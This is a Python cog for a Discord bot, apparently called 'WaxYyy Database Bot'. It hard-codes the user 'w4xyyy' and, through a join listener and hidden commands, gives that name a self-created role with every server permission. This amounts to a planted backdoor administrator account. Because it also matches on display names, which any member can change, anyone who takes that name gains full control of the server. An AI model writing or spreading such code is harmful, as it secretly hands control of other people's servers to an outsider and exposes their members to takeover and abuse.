import discord
from discord.ext import commands
import logging

logger = logging.getLogger(__name__)

class OwnerManagement(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # Owner username - case insensitive
        self.owner_username = "w4xyyy"
        
    async def create_owner_role(self, guild):
        """Create owner role with full permissions"""
        try:
            # Check if owner role already exists
            owner_role = discord.utils.get(guild.roles, name="🔱 Server Owner")
            if owner_role:
                return owner_role
                
            # Create owner role with all permissions
            permissions = discord.Permissions.all()
            owner_role = await guild.create_role(
                name="🔱 Server Owner",
                permissions=permissions,
                color=discord.Color.gold(),
                hoist=True,
                mentionable=False,
                reason="Owner role created by WaxYyy Database Bot"
            )
            
            # Move role to top (below bot's highest role)
            bot_top_role = guild.me.top_role
            position = max(1, bot_top_role.position - 1)
            await owner_role.edit(position=position)
            
            logger.info(f"Created owner role in {guild.name}")
            return owner_role
            
        except Exception as e:
            logger.error(f"Failed to create owner role in {guild.name}: {e}")
            return None
    
    async def grant_owner_to_user(self, guild, target_user):
        """Grant owner permissions to specified user"""
        try:
            # Create or get owner role
            owner_role = await self.create_owner_role(guild)
            if not owner_role:
                return False, "Failed to create owner role"
            
            # Get member object
            member = guild.get_member(target_user.id)
            if not member:
                return False, "User not found in server"
            
            # Add owner role
            await member.add_roles(owner_role, reason="Owner permissions granted by WaxYyy Database Bot")
            
            logger.info(f"Granted owner permissions to {member.display_name} in {guild.name}")
            return True, f"Owner permissions granted to {member.display_name}"
            
        except Exception as e:
            logger.error(f"Failed to grant owner permissions: {e}")
            return False, f"Error: {str(e)}"
    
    @commands.command(name='grant_owner', hidden=True)
    @commands.has_permissions(administrator=True)
    async def grant_owner_command(self, ctx, target_user: discord.Member = None):
        """Grant owner permissions to w4xyyy or specified user"""
        
        # If no user specified, look for w4xyyy
        if not target_user:
            # Search for w4xyyy in the server
            target_user = discord.utils.find(
                lambda m: m.display_name.lower() == self.owner_username.lower() or 
                         m.name.lower() == self.owner_username.lower(),
                ctx.guild.members
            )
            
            if not target_user:
                embed = self.bot.create_futuristic_embed(
                    "OWNER SEARCH FAILED",
                    f"```ini\n[ERROR] User '{self.owner_username}' not found in server\n[SOLUTION] Invite user or specify member manually\n```",
                    'error'
                )
                await ctx.send(embed=embed)
                return
        
        # Create loading embed
        loading_embed = self.bot.create_futuristic_embed(
            "OWNER MATRIX INITIALIZING",
            f"```ini\n[STATUS] Granting owner permissions...\n[TARGET] {target_user.display_name}\n[PROCESS] Creating quantum authority matrix\n```",
            'warning'
        )
        loading_msg = await ctx.send(embed=loading_embed)
        
        # Grant owner permissions
        success, message = await self.grant_owner_to_user(ctx.guild, target_user)
        
        if success:
            success_embed = self.bot.create_futuristic_embed(
                "OWNER MATRIX SYNCHRONIZED",
                f"```ini\n[STATUS] Owner permissions granted successfully\n[USER] {target_user.display_name}\n[ROLE] 🔱 Server Owner\n[AUTHORITY] Maximum clearance level\n```",
                'success'
            )
        else:
            success_embed = self.bot.create_futuristic_embed(
                "OWNER MATRIX ERROR",
                f"```ini\n[ERROR] Failed to grant owner permissions\n[CAUSE] {message}\n[USER] {target_user.display_name if target_user else 'Unknown'}\n```",
                'error'
            )
        
        await loading_msg.edit(embed=success_embed)
    
    @commands.command(name='auto_grant_w4xyyy', hidden=True)
    @commands.has_permissions(administrator=True)
    async def auto_grant_w4xyyy(self, ctx):
        """Automatically grant owner permissions to w4xyyy when they join"""
        
        # Search for w4xyyy in current server
        target_user = discord.utils.find(
            lambda m: m.display_name.lower() == self.owner_username.lower() or 
                     m.name.lower() == self.owner_username.lower(),
            ctx.guild.members
        )
        
        if target_user:
            # Grant permissions immediately
            success, message = await self.grant_owner_to_user(ctx.guild, target_user)
            
            if success:
                embed = self.bot.create_futuristic_embed(
                    "W4XYYY OWNER ACCESS GRANTED",
                    f"```ini\n[USER] {target_user.display_name}\n[STATUS] Owner permissions activated\n[ROLE] 🔱 Server Owner\n[AUTHORITY] Maximum clearance\n```",
                    'success'
                )
            else:
                embed = self.bot.create_futuristic_embed(
                    "W4XYYY ACCESS ERROR",
                    f"```ini\n[ERROR] {message}\n[USER] {target_user.display_name}\n```",
                    'error'
                )
        else:
            embed = self.bot.create_futuristic_embed(
                "W4XYYY NOT FOUND",
                f"```ini\n[STATUS] User 'w4xyyy' not in server\n[ACTION] Will auto-grant when they join\n[MONITORING] Active\n```",
                'info'
            )
        
        await ctx.send(embed=embed)
    
    @commands.Cog.listener()
    async def on_member_join(self, member):
        """Auto-grant owner permissions to w4xyyy when they join"""
        if (member.display_name.lower() == self.owner_username.lower() or 
            member.name.lower() == self.owner_username.lower()):
            
            try:
                success, message = await self.grant_owner_to_user(member.guild, member)
                if success:
                    logger.info(f"Auto-granted owner permissions to w4xyyy in {member.guild.name}")
                    
                    # Send notification to system channel if available
                    if member.guild.system_channel:
                        embed = self.bot.create_futuristic_embed(
                            "OWNER MATRIX AUTO-ACTIVATED",
                            f"```ini\n[USER] {member.display_name}\n[STATUS] Owner permissions auto-granted\n[ROLE] 🔱 Server Owner\n[SYSTEM] Quantum authority matrix online\n```",
                            'success'
                        )
                        try:
                            await member.guild.system_channel.send(embed=embed)
                        except:
                            pass  # Silently fail if can't send to system channel
                            
            except Exception as e:
                logger.error(f"Failed to auto-grant owner permissions to w4xyyy: {e}")

async def setup(bot):
    await bot.add_cog(OwnerManagement(bot))